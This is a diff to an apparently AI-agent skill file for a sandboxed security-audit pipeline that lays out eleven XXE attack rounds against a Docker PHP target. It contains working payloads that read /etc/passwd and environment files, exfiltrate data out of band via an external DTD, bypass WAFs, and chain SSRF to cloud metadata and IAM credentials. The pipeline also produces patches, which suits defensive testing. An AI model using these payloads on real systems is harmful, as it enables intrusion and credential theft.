@@ -2,7 +2,34 @@
 > **Input**: attack_plans/{sink_id}_plan.json, Docker container access
 > **Output**: exploit_results/{sink_id}_result.json, PoC脚本/{sink_id}_poc.py
 
+
+## Identity
+
+| Field | Value |
+|-------|-------|
+| Skill ID | S-047-B |
+| Phase | Phase-4 (Attack) |
+| Responsibility | Execute progressive multi-round attack against XML External Entity sinks |
+
+## Input Contract
+
+| File | Source | Required | Fields Used |
+|------|--------|----------|-------------|
+| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
+| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
+| Container | Docker `php` container | ✅ | `exec` access |
+
 ## 11 Attack Rounds
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R1 - Basic External Entity
 
@@ -13,6 +40,16 @@
 ```
 Target: `/etc/passwd`, `/etc/hostname`, `/proc/self/environ`, application config files.
 **Evidence:** Response contains file contents (e.g., `root:x:0:0:`).
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R2 - Parameter Entity Recursion
 
@@ -26,6 +63,16 @@ Target: `/etc/passwd`, `/etc/hostname`, `/proc/self/environ`, application config
 ```
 `evil.dtd`: `<!ENTITY % all "<!ENTITY send '%file;'>"> %all;`
 **Evidence:** Parameter entity parsed successfully and data exfiltrated.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R3 - Blind XXE (Out-of-Band)
 
@@ -44,6 +91,16 @@ Use the OOB listener within the Docker environment instead of an external server
 **Verify via OOB logs:** `grep "xxe-exfil-${SINK_ID}" $WORK_DIR/oob/log.jsonl` — presence confirms Blind XXE via log records.
 **Evidence:** OOB listener log received HTTP request containing Base64-encoded file data.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R4 - CDATA Wrapping to Bypass WAF
 
 ```xml
@@ -58,6 +115,16 @@ Use the OOB listener within the Docker environment instead of an external server
 `cdata.dtd`: `<!ENTITY all "%start;%file;%end;">`
 **Evidence:** File contents returned wrapped in CDATA.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R5 - Encoding Bypass (UTF-7/UTF-16)
 
 Re-encode XML to bypass UTF-8 input validation that checks for `<!DOCTYPE`/`<!ENTITY`:
@@ -66,6 +133,16 @@ Re-encode XML to bypass UTF-8 input validation that checks for `<!DOCTYPE`/`<!EN
 - `<?xml version="1.0" encoding="UTF-7"?>`
 
 **Evidence:** Parser accepts the alternative encoding and processes entities.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R6 - XInclude Attack
 
@@ -76,6 +153,16 @@ When unable to control the full XML document but can inject values:
 </foo>
 ```
 **Evidence:** XInclude parsing succeeds and file contents appear in the response.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R7 - SVG/DOCX/XLSX XML Carriers
 
@@ -88,6 +175,16 @@ Embed XXE in XML-format files and upload:
 DOCX/XLSX: Decompress, inject into `[Content_Types].xml` or `word/document.xml`, recompress.
 **Evidence:** Server-side parser processes the carrier file and resolves entities.
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R8 - Chained (XXE → SSRF → Internal Data)
 
 Chain XXE with SSRF to reach internal services:
@@ -98,6 +195,16 @@ Chain XXE with SSRF to reach internal services:
 ```
 Path: XXE → Cloud metadata → IAM credentials → Internal API → Sensitive data.
 **Evidence:** Response contains internal service data, cloud credentials, or metadata.
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R9 - PHP-Specific XXE Techniques
 
@@ -118,6 +225,16 @@ Path: XXE → Cloud metadata → IAM credentials → Internal API → Sensitive 
   <!ENTITY xxe SYSTEM "compress.zlib:///etc/passwd">
   ```
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R10 - JSON → XML Content-Type Switching
 
 Objective: Send XML Content-Type requests to JSON API endpoints to test for XML parsing.
@@ -136,6 +253,16 @@ Objective: Send XML Content-Type requests to JSON API endpoints to test for XML 
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root><user>&xxe;</user></root>
   ```
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R11 - XXE in File Parsing Libraries
 
@@ -275,6 +402,64 @@ After completing all rounds, write the final result to `$WORK_DIR/exploits/{sink
 - All out-of-band data exfiltration MUST use only the designated attacker-controlled infrastructure
 - Stop escalation after R1 confirms via response content; continue to higher rounds only when lower rounds fail or coverage is needed
 
+
+
+## Output Contract
+
+| Output File | Path | Description |
+|-------------|------|-------------|
+| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | Final verdict + all round records |
+| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
+| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |
+
+## Examples
+
+### ✅ GOOD Example — Complete, Valid Exploit Result
+
+```json
+{
+  "sink_id": "xxe_import_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 3,
+  "successful_round": 1,
+  "payload": "<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>",
+  "evidence_result": "Response body contains root:x:0:0:root:/root:/bin/bash from entity resolution",
+  "severity": {
+    "level": "H",
+    "score": 2.4,
+    "cvss": 8.0
+  }
+}
+```
+
+**Why this is good:**
+- `evidence_result` contains specific, verifiable proof of exploitation
+- `severity` scoring is consistent: score 2.4 → cvss 8.0 → level `H`
+- `rounds_executed` shows progressive effort, not a single blind attempt
+- All required fields are populated with concrete values
+
+### ❌ BAD Example — Incomplete, Invalid Exploit Result
+
+```json
+{
+  "sink_id": "xxe_import_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 1,
+  "successful_round": 1,
+  "payload": "<!ENTITY xxe SYSTEM "file:///etc/passwd">",
+  "evidence_result": "",
+  "failure_reason": "",
+  "severity": {
+    "level": "M",
+    "score": null
+  }
+}
+```
+
+**Issues:**
+- evidence_result is empty — no file content from entity resolution shown
+- failure_reason is empty — no explanation of parsing result
+- severity_level 'M' for confirmed XXE reading /etc/passwd — should be H or C
 
 ---
 
